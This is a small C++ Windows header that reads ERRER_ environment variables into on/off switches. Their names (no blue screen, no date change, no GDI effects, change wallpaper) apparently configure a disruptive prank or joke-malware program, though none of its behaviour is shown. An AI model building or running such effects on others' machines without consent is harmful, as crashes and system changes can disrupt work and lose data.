#pragma once
#include <windows.h>
#include <wchar.h>

static bool EnvFlag(const wchar_t* name) {
    wchar_t buf[8];
    DWORD n = GetEnvironmentVariableW(name, buf, 8);
    return n > 0 && n <= 8 && _wcsicmp(buf, L"1") == 0;
}

static bool NoBsodFlag()       { return EnvFlag(L"ERRER_NOBSOD"); }
static bool NoDateChangeFlag() { return EnvFlag(L"ERRER_NODATECHANGE"); }
static bool NoGdiFlag()        { return EnvFlag(L"ERRER_NOGDI"); }
static bool EndermanchFlag()   { return EnvFlag(L"ERRER_ENDERMANCH"); }
static bool OriginalFlag()     { return EnvFlag(L"ERRER_ORIGINAL"); }
static bool NoToastsFlag()     { return EnvFlag(L"ERRER_NOTOASTS"); }
static bool NoSongFlag()       { return EnvFlag(L"ERRER_NOSONG"); }
static bool ChangeWallpaperFlag() { return EnvFlag(L"ERRER_CHANGEWALLPAPER"); }
static bool NewExplorerFlag()  { return EnvFlag(L"ERRER_NEWEXPLORER"); }
static bool DebugFlag()        { return EnvFlag(L"ERRER_DEBUG"); }